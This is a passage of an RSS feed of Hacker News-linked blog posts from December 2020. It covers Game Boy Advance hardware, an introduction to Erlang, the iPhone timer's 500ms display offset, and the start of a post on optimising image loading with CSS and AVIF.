‚Üí <strong>EmbeddedICE macrocell</strong>: Debug module that allows hardware breakpoints, watchpoints and allows the system to be halted while debugging.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence on the final design of this console. Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) ‚Üí 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) ‚Üí 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Although this console was marketed as a 32-bit system, the majority of its memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction fetch. Only critical sections should use the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility?</h4><p>You‚Äôll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you‚Äôll find the system a mix between the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/writings/consoles/game-boy/#graphics">Game Boy</a>, the graphics core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I‚Äôll be revisiting lots of previously-explained concepts.</p><p>Compared to previous Game Boys we now have a colour LCD screen that can display up to 32,768 colours (15-bit). It has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>
<img name="image_cover" alt="Image" width="630" height="273" src="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png" loading="auto"></picture></a><figcaption>Memory architecture of the PPU</figcaption></div><p>We have the following regions of memory in which to distribute our graphics:</p><ul><li>96 KB 16-bit <strong>VRAM</strong> (Video RAM): Where 64 KB store background graphics and 32 KB store sprite graphics.</li><li>1 KB 32-bit <strong>OAM</strong> (Object Attribute Memory): Stores up to 128 sprite entries (not the graphics, just the indices and attributes). Its bus is optimised for fast rendering.</li><li>1 KB 16-bit <strong>PAL RAM</strong> (Palette RAM): Stores two palettes, one for backgrounds and the other for sprites. Each palette contains 256 entries of 15-bit colours each, colour ‚Äò0‚Äô being <em>transparent</em>.</li></ul><h4 id="constructing-the-frame">Constructing the frame</h4><p>If you‚Äôve read the previous articles you‚Äôll find the GBA familiar, although there is additional functionality that may surprise you, and don‚Äôt forget that this console runs on two AA batteries.</p><p>I‚Äôm going to borrow the graphics of Sega‚Äôs <em>Sonic Advance 3</em> to show how a frame is composed.</p><div><ul><li id="tab-2-1-tiles-link"><a href="#tab-2-1-tiles">Tiles</a></li><li id="tab-2-2-backgrounds-link"><a href="#tab-2-2-backgrounds">Backgrounds</a></li><li id="tab-2-3-sprites-link"><a href="#tab-2-3-sprites">Sprites</a></li><li id="tab-2-4-result-link"><a href="#tab-2-4-result">Result</a></li></ul><div><div id="tab-2-1-tiles"><h4>Tiles</h4><div><figcaption>4bpp Tiles found in VRAM<br>Last block is reserved for sprites</figcaption></div><p>GBA‚Äôs tiles are strictly 8x8 pixel bitmaps, they can use 16 colours (4bpp) or 256 colours (8bpp). 4bpp tiles consume 32 bytes, while 8bpp ones take 64 bytes.</p><p>Tiles are grouped into <strong>charblocks</strong>. Each block is reserved for a specific type of layer.</p><p>Because each charblock is designed to fit in 16 KB of memory, up to 256 8bpp tiles or 512 4bpp tiles can be stored per block. There are six charblocks allocated, which combined require 96 KB of memory: The exact amount of VRAM this console has.</p><p>Four charblocks are used for backgrounds and two are used for sprites.</p></div><div id="tab-2-2-backgrounds"><h4>Backgrounds</h4><div><figcaption>Affine background layers in use<br>Layer 3 will be scaled to simulate water effects</figcaption></div><p>The background layer of this system has improved significantly since the Game Boy Color. It finally includes some features found in the <a href="https://www.copetti.org/writings/consoles/super-nintendo/">Super Nintendo</a> (remember the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#unique-features">affine transformations</a>?).</p><p>The PPU can draw up to four background layers. The capabilities of each one will depend on the selected mode of operation:</p><ul><li><strong>Mode 0</strong>: Provides four static layers.</li><li><strong>Mode 1</strong>: Only three layers are available, although one of them is <strong>affine</strong> (can be rotated and/or scaled).</li><li><strong>Mode 2</strong>: Supplies two affine layers.</li></ul><p>Each layer be up to 512x512 pixels wide. If it‚Äôs an affine one then it will be up to 1024x1024 pixels.</p></div><div id="tab-2-3-sprites"><h4>Sprites</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png" loading="auto"></picture></a><figcaption>Rendered Sprite layer</figcaption></div><p>The size of a sprite can be up to 64x64 pixels wide, yet for having such a small screen they will end up occupying a big part of it.</p><p>If that wasn‚Äôt enough, the PPU can now apply <strong>affine transformations</strong> to sprites!</p><p>Sprite entries are 32-bit wide and their values can be divided in two groups:</p><ul><li><strong>Attributes</strong>: Contains x/y position, h/v flipping, size, shape (square or rectangle), sprite type (affine or regular) and location of first tile.</li><li><strong>Affine data</strong>: Only used if the sprite is affine, specify scaling and rotation.</li></ul></div><div id="tab-2-4-result"><h4>Result</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png" loading="auto"></picture></a><figcaption>All layers merged (<i>Tada!</i>)</figcaption></div><p>As always, the PPU will combine all layers automatically, but it‚Äôs not over yet! The system has a couple of effects available to apply over these layers:</p><ul><li><strong>Mosaic</strong>: Makes tiles look more <em>blocky</em>.</li><li><strong>Alpha blending</strong>: Combines colours of two overlapping layers resulting in transparency effects.</li><li><strong>Windowing</strong>: Divides the screen into two different <em>windows</em> where each one can have its own separate graphics and effects, the outer zone of both windows can also be provided with tiles.</li></ul><p>On the other side, in order to update the frame there are multiple options available:</p><ul><li>Command the <strong>CPU</strong> during VBlank/HBlank: The <em>traditional way</em>.</li><li>Use the <strong>DMA Controller</strong>: DMA provides transfer rates ~10x faster and can be scheduled during VBlank and HBlank. This console provides 4 DMA channels (two reserved for sound, one for critical operations and the other for general purpose). Bear in mind that the controller will halt the CPU during the operation (although it may hardly notice it!).</li></ul></div></div></div><h4 id="beyond-tiles">Beyond Tiles</h4><p>Sometimes we may want to compose a background from which the tile engine won‚Äôt be able to draw all required graphics. Now, modern consoles addressed this by implementing a <strong>frame-buffer</strong> architecture but this is not possible when there‚Äôs very little RAM‚Ä¶ Well, the GBA happens to have 96 KB of VRAM which is enough to allocate a <strong>bitmap</strong> with the dimensions of our LCD screen.</p><p>Good news is that the PPU actually implemented this functionality by including three extra modes, these are called <strong>bitmap modes</strong>:</p><ul><li><strong>Mode 3</strong>: Allocates a single fully-coloured (8bpp) frame.</li><li><strong>Mode 4</strong>: Provides two frames with half the colours (4bpp) each.</li><li><strong>Mode 5</strong>: There‚Äôs two fully-coloured frames with half the size each (160x128 pixels).</li></ul><p>The reason for having two bitmaps is to enable <strong>page flipping</strong>: Drawing over a displayed bitmap can expose some weird artefacts during the process. If instead we manipulate another one then none of the glitches will be shown to the user. Once the second bitmap is finished the PPU can be updated to point to the second one, effectively swapping the displayed frame.</p><div><p>Overall it sounds like a cutting-the-edge feature, however most games held on to the tile engine. Why? Because in practice it <strong>costs a lot of CPU resources</strong>.</p><p>You see, while using a tile engine the CPU can delegate most of the computations to the graphics chip. By contrast, the frame-buffer system that the PPU provides is limited to only displaying that segment of memory as a <strong>single background layer</strong>, that means no more individual affine transformations, layering ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.copetti.org/writings/consoles/game-boy-advance/">https://www.copetti.org/writings/consoles/game-boy-advance/</a></em></p>]]>
            </description>
            <link>https://www.copetti.org/writings/consoles/game-boy-advance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564619</guid>
            <pubDate>Mon, 28 Dec 2020 23:32:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Erlang: The Programming Language That Quietly Powers WhatsApp and WeChat]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25564176">thread link</a>) | @factandfiction
<br/>
December 28, 2020 | https://serokell.io/blog/introduction-to-erlang | <a href="https://web.archive.org/web/*/https://serokell.io/blog/introduction-to-erlang">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, we will look at a rather old and somewhat quirky language that most of you probably don‚Äôt have on your radars.</p><p>While Erlang is not as popular as some modern programming languages, it quietly runs applications like WhatsApp and WeChat that serve massive amounts of users every day.</p><p>In this article, I will tell you more about this language, its history, and whether you should think about learning it yourself.</p><h2 id="what-is-erlang%2C-and-where-is-it-used%3F">What is Erlang, and where is it used?</h2><p>Erlang is a functional, general-purpose language oriented towards building scalable, concurrent systems with high availability guarantees.</p><p>It was built at the end of the 1980s at Ericsson for handling telephone switches. At the time, telephone switching systems were one of the most complicated systems out there, like the internet is nowadays. For this reason, the language used to program them needed to support high concurrency and zero downtime.</p><p>After going through multiple existing language options, three guys at the company ‚Äì Joe Armstrong, Robert Virding, and Mike Williams ‚Äì decided to create their own. This led to one of the coolest programming languages and, perhaps, the most awesome <a href="https://www.youtube.com/watch?v=BXmOlCy0oBM">marketing video</a> for a language I‚Äôve ever seen.</p><p><img src="https://serokell.io/files/qa/qap56dhf.1_(41)_(1).jpg" alt="Erlang logo" loading="lazy"></p><p>So, what distinguishes this language from all of the others?</p><h3 id="process-oriented">Process-oriented</h3><p>The main thing that distinguishes Erlang from other languages is its process-based computing model. It uses isolated, lightweight processes that communicate with each other through messages.</p><p>These processes can receive messages and, in response to messages, create new processes, send messages to other processes, or modify their state. In other words, Erlang follows the <a href="https://www.brianstorti.com/the-actor-model/">actor model</a>. If you‚Äôve used Akka on JVM, you‚Äôll feel right at home.</p><p><img src="https://serokell.io/files/nl/nlvg3wnn.2_(32)_(1).jpg" alt="Erlang processes actors" loading="lazy"></p><p>The processes are isolated, fast to create, and take up only a small amount of memory. It is easy to expand your system by creating more of them. Since the processes don‚Äôt discern whether the other processes are on the same core or in another place, you can easily scale both horizontally (by adding more machines) and vertically (by adding cores).</p><h3 id="functional">Functional</h3><p>People usually group Erlang as a functional programming language with other languages like Scala and Haskell. Some of FP characteristics are:</p><ul>
<li>frequent use of pure functions</li>
<li>higher-order functions</li>
<li>pattern matching</li>
</ul><p>More about functional programming you can find in our <a href="https://serokell.io/blog/introduction-to-functional-programming">introduction to FP</a>.</p><h3 id="what-is-erlang-good-for%3F">What is Erlang good for?</h3><p>Primarily, Erlang is a good choice whenever messaging between multiple agents across the network is involved, since that maps well on the basic structure of the language.</p><p>It is excellent for:</p><ul>
<li><strong>Chat apps.</strong> Messaging apps, including some famous examples like WeChat and WhatsApp, use Erlang to handle insane amounts of concurrent users. Erlang has a wonderful messaging platform called <a href="https://www.ejabberd.im/">ejabberd</a> that can be used to create large-scale chat apps.</li>
<li><strong>Message queue systems</strong>. <a href="https://www.rabbitmq.com/">RabbitMQ</a>, an open-source message broker that implements AMQP and other protocols, is a huge success story for Erlang.</li>
<li><strong>Blockchains.</strong> <a href="https://aeternity.com/">Aeternity</a>, a blockchain for scalable, secure, and decentralized dapps, uses Erlang for its node implementation.</li>
<li><strong>Binary manipulation.</strong> Historically, Erlang has had to support rapid implementation of binary protocols for telecom purposes. Hence, it has features that make binary manipulation much more comfortable, such as pattern matching on binaries. You can, for example, use Erlang as <a href="https://doma.dev/#an-extra-bit-for-every-byte-ctf"><code>sed</code> for binaries</a>.</li>
<li><strong>Other distributed, high-performance services.</strong> If you need to process transactions coming from a ton of places in your fintech project or create a bidding/user matching platform, Erlang is not the worst choice either.</li>
</ul><p>You can check out some of the frequent use cases of Erlang in <a href="https://serokell.io/blog/elixir-companies">our list of Elixir and Erlang companies</a>.</p><h3 id="this-looks-complicated.-can-i-build-a-web-app-in-erlang%3F">This looks complicated. Can I build a web app in Erlang?</h3><p>Yes. Overall, Erlang is well-suited for creating fast and scalable web apps. If you get there, it is quite rewarding. There are some caveats, though.</p><p>At the core of your web app (and any other app that works with HTTP) will be <a href="https://github.com/ninenines/cowboy">Cowboy</a>, but further than that, you need to know what a web app consists of and pick your tools for each layer separately.</p><p>Libraries are well documented, but novice-level introductory material is relatively sparse, and you won‚Äôt find tutorials for everything. It‚Äôs not JavaScript.</p><p>All in all, if you do decide to build web apps, using <a href="https://serokell.io/blog/introduction-to-erlang#erlang-vs.-elixir">Elixir</a>, a language built on top of Erlang, might be a better choice.</p><h2 id="why-should-you-use-erlang-in-your-project%3F">Why should you use Erlang in your project?</h2><p>Erlang has three significant advantages over other programming languages, which mainly stem from the unique way the language is built.</p><ul>
<li><strong>Concurrency.</strong> BEAM, the Erlang virtual machine, uses lightweight threads of execution (called processes). These are isolated, run across all CPUs, and communicate through messages. Because of that and language‚Äôs functional nature, it is less hard to write concurrent programs in Erlang.</li>
<li><strong>Scalability.</strong> Erlang is perfectly suited to the distributed nature of modern computing and today‚Äôs multicore CPUs. Erlang processes allow us to easily scale systems, both by adding more machines and by adding more cores to existing machines.</li>
<li><strong>Reliability.</strong> Erlang has a motto ‚Äì <a href="https://verraes.net/2014/12/erlang-let-it-crash/">‚Äúlet it crash‚Äù</a>. Because of the unique approach to fault-tolerance, lightweight processes can be quickly restarted by the supervisor system, which helps you build self-healing systems. While this may not seem reliable, it deals with most bugs that are not due to severe implementation errors.</li>
</ul><h2 id="let-it-crash">Let it crash</h2><p>In this section, I‚Äôll try to bring insight into how an Erlang app is structured and how the ‚Äúlet it crash‚Äù philosophy works out in real life.</p><p>In all actuality, letting it crash is not about crashing for the user or the system. That is something Erlang tries very hard to avoid. Rather, it is about containing failure when it inescapably happens, since in life, things do sometimes fail. Shit happens. Let‚Äôs see how Erlang cleans it up.</p><p>Basically, an Erlang app is a tree of processes.</p><p><img src="https://serokell.io/files/7z/7zr4ovpa.3_(30)_(1).jpg" alt="Erlang app" loading="lazy"></p><p>At the bottom leaves of the tree, we have worker processes ‚Äì the ones doing most of the work. Up from them, we have supervisors, which launch the workers and check up on them.</p><p>Supervisors themselves can be supervised; we can easily add a Grand Supervisor on top of the tree here.</p><p><img src="https://serokell.io/files/dt/dtuuj6hz.4_(24)_(1).jpg" alt="Erlang supervision tree" loading="lazy"></p><p>In case a process crashes, it sends a message to its supervisor. Depending on the supervision strategy set, either just the process is restarted or all of the processes underneath its supervisor are.</p><p>If restarting the connected workers doesn‚Äôt solve the problem a given amount of times in a period, the supervisor will terminate all its children and then itself. At that point, the responsibility to try to handle the problem is pushed upwards to the next supervision layer.</p><p><img src="https://serokell.io/files/eo/eoil770p.5_(20)_(1).jpg" alt="handling failure" loading="lazy"></p><p>Only if the top-level supervisor fails does it not get restarted and the application crashes.</p><h2 id="erlang-vs.-elixir">Erlang vs. Elixir</h2><p>Erlang isn‚Äôt the only language that operates on BEAM; there are multiple others. The main one is Elixir.</p><h3 id="what-is-elixir%3F">What is Elixir?</h3><p><img src="https://serokell.io/files/ph/ph8n4xcr.erlang-elixir-what-the-hell-is-this-ruby-how-it-39889435.jpg" alt="Elixir Erlang meme" loading="lazy"></p><p>Elixir was created by Jos√© Valim in the early 2010s. He took Erlang and made a thin layer on top of it that had a more modern syntax that resembled Ruby.</p><p>The resulting language was an improvement over both Erlang and Ruby. It experienced a decent popularity surge in 2015-2016, when <a href="https://www.phoenixframework.org/">Phoenix</a>, its main web framework, was released.</p><p>You can read more about Elixir and Phoenix in our <a href="https://serokell.io/blog/introduction-to-elixir">introduction to Elixir</a>.</p><h3 id="advantages-of-elixir-over-erlang">Advantages of Elixir over Erlang</h3><p>Elixir doesn‚Äôt actually add a lot of new features to Erlang. Everything you can do in Elixir, you can do in Erlang as well, and it is possible to call both languages from each other. Most of Elixir‚Äôs advantages stem from the fact that it has a more modern, Ruby-like syntax, which has led to it being more popular than Erlang.</p><p>Here are Elixir‚Äôs advantages over Erlang:</p><ul>
<li><strong>Modern syntax.</strong> The syntax of Elixir is much easier to understand if you‚Äôve already programmed in virtually any other popular programming language. It removes some amount of boilerplate code and can lead to higher developer productivity.</li>
<li><strong>Higher popularity.</strong> Elixir has been the more popular of the two for quite some time, so content regarding Elixir is more up-to-date, and there is more of it out there.</li>
<li><strong>Frameworks.</strong> If you‚Äôre into web development, Phoenix is one of the best frameworks out there, and it is definitely the most convenient one if you want to do web development <em>and</em> functional programming. Talking about frameworks, Elixir also has Nerves ‚Äì an awesome framework for embedded software. If this is the route you want to take, Elixir is a better choice.</li>
</ul><h2 id="is-erlang-worth-learning%3F">Is Erlang worth learning?</h2><p>So, why should you learn this language? There are three reasons:</p><ul>
<li>You‚Äôre eyeing a position in the specific fields that Erlang is used in. E.g. you adore chat apps and you would like to work at WhatsApp. That‚Äôs reasonable.</li>
<li>You want to write really small, portable programs with as little dependencies as possible. Erlang actually enables you to do a whole lot out of the box.</li>
<li>You‚Äôre a genuinely curious human being and want to discover new ways of programming without an immediate benefit to bottom line. In that case, I welcome you to the ranks of BEAM.</li>
</ul><p>If the last is true, I would actually point your way towards Elixir. While both languages are great to use, Elixir is the one that seems to be more popular lately. It will give you more job opportunities and will be easier to learn.</p><p>Afterward, you can learn Erlang and what makes it tick. Knowing how Erlang functions underneath Elixir will help you write better Elixir code and make you more likely to get hired as an Elixir developer.</p><p>Anyway, I don‚Äôt think you will regret any part of journeying BEAM, even though it is not all sunshine and rainbows (BEAM languages can get quite weird sometimes). If you are wondering where to start, I‚Äôd guide you either to <a href="https://learnyousomeerlang.com/">Learn You Some Erlang for Great Good!</a> or our beginner‚Äôs guide on <a href="https://serokell.io/blog/learn-elixir">learning Elixir</a>.</p><p>If you would like to read more posts on BEAM languages, don‚Äôt be afraid to also follow us on <a href="https://twitter.com/serokell">Twitter</a> or <a href="https://serokell.medium.com/">Medium</a>.</p></div></div>]]>
            </description>
            <link>https://serokell.io/blog/introduction-to-erlang</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564176</guid>
            <pubDate>Mon, 28 Dec 2020 22:46:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the iPhone Timer app displays a fake time]]>
            </title>
            <description>
<![CDATA[
Score 208 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25563708">thread link</a>) | @_antix
<br/>
December 28, 2020 | https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/ | <a href="https://web.archive.org/web/*/https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>While building my event timer app called <a href="https://stagetimer.io/">stagetimer.io</a> I came across a peculiarity with displaying time and found out that the iPhone timer addresses it by showing us a fake time. By definition, a countdown shows how much time is left. So if the countdown says 5s we assume there are 5 seconds left. But that‚Äôs not the whole truth.</p>

<p>The iPhone countdown timer doesn‚Äôt strictly display the correct time but adds 500ms, or half a second, to the remaining time. It does this to make the reading of time more intuitive for humans. The alarm at the end of the countdown is not affected by this 500ms inaccuracy.</p>

<p>Javascript likes to use milliseconds when dealing with time, 1000ms equals 1s. Here is an example of a 5s countdown that starts at 5000ms and uses the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval">setInterval()</a> function to deduct 10ms every 10ms, simple enough. Milliseconds are converted to seconds by dividing by 1000 and rounding down like so: <code>Math.floor(milliseconds / 1000)</code></p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds.gif" data-still="/img/writing/5s-timer-seconds.png" alt="5s countdown timer showing only seconds">
  </figure>
</div>
<p>The timer jumps to 4s right when hitting start and once the timer switches to 0s there are still 1s to go. This makes a lot of sense when counting up, for example, 10:00 is displayed during the first minute of 10 AM, not 10:01, always rounding down. But for a countdown timer, this is counterintuitive. It is easier to understand if the timer has a fractional seconds display.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-fractions.gif" data-still="/img/writing/5s-timer-seconds-fractions.png" alt="5s countdown timer showing seconds and its fractions">
  </figure>
</div>
<p>Now the timer displays 0.9s seconds instead of 0s to show clearly that there is still time left on the clock. However, I didn‚Äôt want to show fractional seconds for my timer.</p>

<p>Now I was curious how my iPhone solves this conundrum. So I set my iPhone timer to 5s:</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-iphone.gif" data-still="/img/writing/5s-timer-iphone.png" alt="5s countdown timer on the iPhone">
  </figure>
</div>
<p>After I click ‚ÄúStart‚Äù the iPhone timer shows 5s, not 4s like in the example above. But it switches to 4s before a full second expired. It then counts proper seconds until it reaches 0s which, again, is not a full second. And if you tap ‚ÄúPause‚Äù just after it jumped to 0s it will promptly jump back to 1s to show you that there is, in fact, still some time left on the countdown.</p>
<p>I figured that the good folks at Apple add an extra fake 500ms to the actual time to start that countdown display at 5s instead of 4s. The timer ends and the phone beeps if the actual time hits 0s and the ‚Äúfake‚Äù time hits 500ms. So they faced the same problem I did and came up with a practical solution. After all, if you start a 5s countdown, it should start at 5s right? For illustration, here is my simple timer doing the same trick.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-fake-seconds.gif" data-still="/img/writing/5s-timer-fake-seconds.png" alt="5s countdown timer showing fake seconds">
  </figure>
</div>
<p>So there you have it, the iPhone timer is technically lying a little bit to you.</p>

<p>Some have pointed out that the problem could be solved more easily by rounding to the nearest second or rounding up instead of rounding down. This is correct. Suppose we have <code>5459543ms</code> that we want to bring into the traditional form <code>HH:mm:ss</code>.</p>
<p>I first divided the number into hours, minutes, and seconds with the help of some modular arithmetic and applied the rounding afterward. Rounding down results in <code>01:30:59</code>, which is correct, but rounding to the nearest integer or rounding up results in the impossible time <code>02:31:60</code>.</p>
<pre><code>time = <span>5459543</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p>However, rounding the time to seconds first <code>5460000ms</code>, and breaking it down afterward yields the same result as described above with adding 500ms, namely <code>01:31:00</code>.</p>
<pre><code>time = <span>5460000</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p><em>Edit 2: In an earlier version I messed up my rounding as described. Many helpful, as well as helpful and insulting, comments pointed out my error. So in addition to learning about counting time I also learned how it feels to be wrong on the internet</em> üòÖ</p>
<h3 id="references"><a href="#references">¬∂</a> References:</h3>
<ul>
<li><a href="https://codepen.io/lhermann/pen/wvzPxXj">The code from the animations in this article</a></li>
</ul>
</div><div><p>I would love to hear from you if this article was helpful or if you have any questions</p><a href="https://twitter.com/_lhermann">Twitter</a></div></div>]]>
            </description>
            <link>https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25563708</guid>
            <pubDate>Mon, 28 Dec 2020 21:56:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Maximally optimizing image loading for the web in 2021]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25563479">thread link</a>) | @cramforce
<br/>
December 28, 2020 | https://www.industrialempathy.com/posts/image-optimizations/ | <a href="https://web.archive.org/web/*/https://www.industrialempathy.com/posts/image-optimizations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>In this post I'll outline 8 image loading optimization techniques to minimize both the bandwidth used for loading images on the web and the CPU usage for image display. I'll present them in the form of an annotated HTML example to make it easy for folks to reproduce the results. Some of these techniques are more established, while others are somewhat novel. Ideally, your favorite mechanism for publishing web documents (like a CMS, static site generator, or web application framework) implements all of these out-of-the-box. I'll keep a <a href="#tools">list updated at the end of this posts</a> with technologies that provide <em>all</em> of the optimizations outlined here.</p><p>Together the techniques optimize all elements of <a href="https://web.dev/vitals/">Google's Core Web Vitals</a> by</p><ul><li>Minimizing the <a href="https://web.dev/lcp/">Largest Contentful Paint (LCP)</a> through reducing bytes, caching, and lazy loading.</li><li>Keeping <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a> to zero.</li><li>Reducing <a href="https://web.dev/fid/">First Input Delay(FID)</a> through reduced (main-thread) CPU usage.</li></ul><p>View the source of this sample image to see all the techniques in action:</p><p><picture><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.avif 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.avif 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.avif 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.avif 320w" type="image/avif"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.webp 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.webp 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.webp 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.webp 320w" type="image/webp"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.jpg 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.jpg 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.jpg 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.jpg 320w" type="image/jpeg"><img alt="Sample image illustrating the techniques outlined in this post." height="2268" src="https://www.industrialempathy.com/img/remote/ZiClJf.jpg" width="4032" decoding="async" loading="lazy"></picture></p><h2 id="responsive-layout">Responsive layout <a href="#responsive-layout">#</a></h2><p>This is a well understood technique to make an image use the available horizontal space up until its maximum size while retaining the aspect ratio. New in 2020 is that web browsers will reserve the correct vertical space for the image before it loads if the <code>width</code> and <code>height</code> attributes are provided for the <code>img</code> element. This avoids <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a>.</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <span>img</span> <span>{</span><br>    <span>max-width</span><span>:</span> 100%<span>;</span><br>    <span>height</span><span>:</span> auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><br><span><span><span>&lt;</span>img</span> <span>height</span><span><span>=</span><span>"</span>853<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>1280<span>"</span></span> <span>‚Ä¶</span> <span>/&gt;</span></span></code></pre><h2 id="lazy-rendering">Lazy rendering <a href="#lazy-rendering">#</a></h2><p>The second technique is more cutting edge. The new CSS attribute <code>content-visibility: auto</code> instructs the browser to not bother layouting the image until it gets near the screen. This has all kinds of benefits, but the most important one might be that the browser will not bother decoding our blurry placeholder image or the image itself unless it has to, saving CPU. Unfortunately, this will cause CLS unless we provide the companion CSS property <code>contain-intrinsic-size</code>. And even more unfortunately, it doesn't come with the awesome inference of the aspect ratio from the <code>width</code> and <code>height</code> attributes and hence we need to provide a relatively complex value that calculates the space the browser should reserve for the image.</p><p>The formula here should work if you provide a <code>--main-width</code> CSS variable describing the width of the main section of your doc. <code>1280px</code> is the max-width of the image, <code>853px</code> the max-height, and <code>0.66640625</code> the aspect-ratio. Yaihh, simple web üòõ</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <br>  <span>main img</span> <span>{</span><br>    <br>    <span>content-visibility</span><span>:</span> auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><span><span><span>&lt;</span>img</span><span><span><br>  <span>style</span></span><span>="</span><br><span>      <span>contain-intrinsic-size</span><span>:</span> </span><br><span>        <span>min</span><span>(</span></span><br><span>          <span>var</span><span>(</span>--main-width<span>)</span><span>,</span> </span><br><span>          1280px<span>)</span> </span><br><span>        <span>min</span><span>(</span></span><br><span>          <span>calc</span><span>(</span><span>var</span><span>(</span>--main-width<span>)</span> * 0.66640625<span>)</span><span>,</span> </span><br><span>          853px<span>)</span><span>;</span></span><span>"</span></span><br><span>/&gt;</span></span></code></pre><h2 id="avif">AVIF <a href="#avif">#</a></h2><p><a href="https://jakearchibald.com/2020/avif-has-landed/">AVIF</a> is the most recent image format that has gained adoption in web browsers. It is currently supported in Chromium browsers, and available behind a flag in Firefox. Safari support isn't available yet, but given that Apple is a member of the <a href="http://aomedia.org/">group</a> that is behind the format, we can expect future support.</p><p>AVIF is notable because it very consistently outperforms JPEG in a very significant way. This is different from WebP which doesn't always produce smaller images than JPEG and may actually be a net-loss due to lack of support for progressive 